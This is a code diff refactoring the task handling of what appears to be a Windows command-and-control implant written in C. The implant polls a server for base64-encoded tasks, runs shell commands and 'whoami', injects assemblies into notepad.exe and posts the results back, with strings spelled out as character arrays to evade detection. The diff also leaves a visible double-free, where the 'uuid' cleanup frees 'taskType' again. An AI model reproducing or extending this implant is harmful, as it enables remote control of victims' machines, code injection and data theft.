@@ -383,7 +383,7 @@ Note:
     // TODO: This function can be improved by using a struct to hold the json
 
 */
-PTask readJsonTask(PAPI api, CHAR* json)
+Task readJsonTask(PAPI api, CHAR* json)
 {
     /*
     general structure of a json request
@@ -403,7 +403,7 @@ PTask readJsonTask(PAPI api, CHAR* json)
     ]
     */
 
-    PTask pTask;
+    Task task = {NULL, NULL, NULL, NULL};
 
     CHAR* tmpJson = json;  // myStrtok modifies the string itself
     CHAR delim = { '\n' };
@@ -414,12 +414,8 @@ PTask readJsonTask(PAPI api, CHAR* json)
     // json is empty
     if (tokensStruct.tokenizedString[0] == '[' && tokensStruct.tokenizedString[1] == ']')
     {
-        return NULL;
+        return task;
     }
-
-    #ifdef DEBUG
-    ((PRINTF)api->printf)(tmpJson);
-    #endif
 
     #ifdef DEBUG
     char hi[] = { 'N', 'u', 'm', 'b', 'e', 'r', 'O', 'f', 'T', 'o', 'k', 'e', 'n', 's', ':', ' ', '%', 'd', '\n', 0 };
@@ -437,7 +433,7 @@ PTask readJsonTask(PAPI api, CHAR* json)
     // remove spaces from the line
     trimmedToken1 = myTrim(api, token, ' ');
     // remove the comma
-    pTask->taskId = myEndTrim(api, trimmedToken1, ',');
+    task.taskId = myEndTrim(api, trimmedToken1, ',');
 
     ((FREE)api->free)(trimmedToken1);
     trimmedToken1 = NULL;
@@ -446,16 +442,16 @@ PTask readJsonTask(PAPI api, CHAR* json)
     trimmedToken1 = myTrim(api, token, ' ');
     trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
     // remove the double quotes
-    pTask->taskParams = myTrim(api, trimmedToken2, '"');
+    task.taskParams = myTrim(api, trimmedToken2, '"');
 
     #ifdef DEBUG
-    if (pTask->task == NULL)
+    if (task.taskParams == NULL)
     {
         char fail_c[] = { 'T', 'a', 's', 'k', 'N', 'U', 'L', 'L', '\n', 0 };
         ((PRINTF)api->printf)(fail_c);
     }
     char task_c[] = { 'T', 'a', 's', 'k', ':' , ' ', '%', 's', '\n', 0 };
-    ((PRINTF)api->printf)(task_c, pTask->task);
+    ((PRINTF)api->printf)(task_c, task.taskParams);
     char note_c[] = { 'N', 'o', 't', 'e', ':', ' ', '%', 's', '\n', 0 };
     char note_cr[] = { 'h', 'i', 0 };
     ((PRINTF)api->printf)(note_c, note_cr);
@@ -473,7 +469,7 @@ PTask readJsonTask(PAPI api, CHAR* json)
     trimmedToken1 = myTrim(api, token, ' ');
     trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
     // remove the double quotes
-    pTask->taskType = myTrim(api, trimmedToken2, '"');
+    task.taskType = myTrim(api, trimmedToken2, '"');
 
     ((FREE)api->free)(trimmedToken1);
     trimmedToken1 = NULL;
@@ -484,14 +480,14 @@ PTask readJsonTask(PAPI api, CHAR* json)
     trimmedToken1 = myTrim(api, token, ' ');
     trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
     // remove the double quotes
-    pTask->uuid = myTrim(api, trimmedToken2, '"');
+    task.uuid = myTrim(api, trimmedToken2, '"');
 
     ((FREE)api->free)(trimmedToken1);
     trimmedToken1 = NULL;
     ((FREE)api->free)(trimmedToken2);
     trimmedToken2 = NULL;
 
-    return pTask;
+    return task;
 }
 
 void myMain()
@@ -645,11 +641,7 @@ void myMain()
     WCHAR fullPath[] = { '/', 't', 'a', 's', 'k', 's', '/', UUID_M };
 
     CHAR* jsonResponse = NULL;
-    CHAR* taskId = { 0 };
-    CHAR* taskType = { 0 };
-    CHAR* agentUuid = { 0 };
-    CHAR* b64Task;
-    CHAR* task = NULL;
+    CHAR* decodedTaskParams = NULL;
     CHAR* orgOutput = NULL;
     DWORD taskSize;
     CHAR* taskOutput;
@@ -685,11 +677,12 @@ void myMain()
         // NOTE: task is an outdated name. The name should be changed with taskParams
         // the real task is determined by reading the taskType variable
     
-        // task is send in base64 format to prevent corrupting json
-        b64Task = readJsonTask(api, jsonResponse, &taskId, &taskType, &agentUuid);
+        // task is sent in base64 format to prevent corrupting json
+        Task task = readJsonTask(api, jsonResponse);
 
-        // json is empty
-        if (b64Task == NULL)
+        // if json is empty
+        // readJsonTask returns a task struct with all fields equal to NULL
+        if (task.taskId == NULL)
         {
             ((SLEEP)api->Sleep)(3000);
             continue;
@@ -698,23 +691,23 @@ void myMain()
         // determine the size for the base64 decoded value
         ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
         (
-                (LPCSTR)b64Task,
-                myStrlenA(b64Task),
+                (LPCSTR)task.taskParams,
+                myStrlenA(task.taskParams),
                 CRYPT_STRING_BASE64,
                 NULL,
                 &taskSize,
                 NULL,
                 NULL
         );
-        task = (CHAR*)((CALLOC)api->calloc)(taskSize+1, sizeof(CHAR));
+        decodedTaskParams = (CHAR*)((CALLOC)api->calloc)(taskSize+1, sizeof(CHAR));
 
         // decode base64 encoded task value
         ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
         (
-                (LPCSTR)b64Task,
-                myStrlenA(b64Task),
+                (LPCSTR)task.taskParams,
+                myStrlenA(task.taskParams),
                 CRYPT_STRING_BASE64,
-                (PBYTE)task,
+                (PBYTE)decodedTaskParams,
                 &taskSize,
                 NULL,
                 NULL
@@ -725,24 +718,24 @@ void myMain()
         CHAR shutdown[] = { 's', 'h', 'u', 't', 'd', 'o', 'w', 'n', 0 };
         CHAR executeAssembly[] = { 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', 0 };
 
-        if (my_strcmp(taskType, cmd) == 0)
+        if (my_strcmp(task.taskType, cmd) == 0)
         {
-            orgOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput);
+            orgOutput = ((RUNCMD)PEsgStdApi->RunCmd)(decodedTaskParams, &sizeOfOutput);
             taskOutput = myTrim(api, orgOutput, '\n');
         }
-        else if (my_strcmp(taskType, whoami) == 0)
+        else if (my_strcmp(task.taskType, whoami) == 0)
         {
             orgOutput = ((WHOAMI)PEsgStdApi->Whoami)();
             taskOutput = myTrim(api, orgOutput, '\n');
         }
-        else if (my_strcmp(taskType, shutdown) == 0)
+        else if (my_strcmp(task.taskType, shutdown) == 0)
         {
             const DWORD dwEncodedExitOutputSize = 17;
             // base64 value of exitSuccess
             CHAR encodedExitOutput[17] = { 'R', 'X', 'h', 'p', 'd', 'F', 'N', '1', 'Y', '2', 'N', 'l', 'c', '3', 'M', '=', 0 };
-            totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(taskId) + myStrlenA(agentUuid) + 16;
+            totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(task.taskId) + myStrlenA(task.uuid) + 16;
             json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
-            ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, encodedExitOutput);
+            ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.uuid, encodedExitOutput);
             PostRequest(api, wServer, port, fullPath2, json);
 
             if (pEsgStdDll->pBuffer)
@@ -753,14 +746,14 @@ void myMain()
             {
                 ((FREE)api->free)(json);
             }
-            if (task)
+            if (decodedTaskParams)
             {
-                ((FREE)api->free)(task);
+                ((FREE)api->free)(decodedTaskParams);
             }
 
             ((EXITTHREAD)api->ExitThread)(0);
         }
-        else if (my_strcmp(taskType, executeAssembly) == 0)
+        else if (my_strcmp(task.taskType, executeAssembly) == 0)
         {
             // use notepad.exe to inject code into
             CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
@@ -784,22 +777,32 @@ void myMain()
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);
 
         // calculate the final json size
-        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(taskId) + myStrlenA(agentUuid) + 16;
+        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(task.taskId) + myStrlenA(task.uuid) + 16;
         // allocate memory for the final json
         json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
         // fill the jsonFormat with relevant values
-        ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
+        ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.uuid, b64EncodedOutput);
         PostRequest(api, wServer, port, fullPath2, json);
 
-        if (b64Task)
+        if (task.taskId)
         {
-            ((FREE)api->free)(b64Task);
-            b64Task = NULL;
+            ((FREE)api->free)(task.taskId);
+            task.taskId = NULL;
         }
-        if (taskId)
+        if (task.taskParams)
         {
-            ((FREE)api->free)(taskId);
-            taskId = NULL;
+            ((FREE)api->free)(task.taskParams);
+            task.taskParams = NULL;
+        }
+        if (task.taskType)
+        {
+            ((FREE)api->free)(task.taskType);
+            task.taskType = NULL;
+        }
+        if (task.uuid)
+        {
+            ((FREE)api->free)(task.taskType);
+            task.taskType = NULL;
         }
         if (orgOutput)
         {
@@ -821,10 +824,10 @@ void myMain()
             ((FREE)api->free)(json);
             json = NULL;
         }
-        if (task)
+        if (decodedTaskParams)
         {
-            ((FREE)api->free)(task);
-            task = NULL;
+            ((FREE)api->free)(decodedTaskParams);
+            decodedTaskParams = NULL;
         }
 
         ((SLEEP)api->Sleep)(3000);
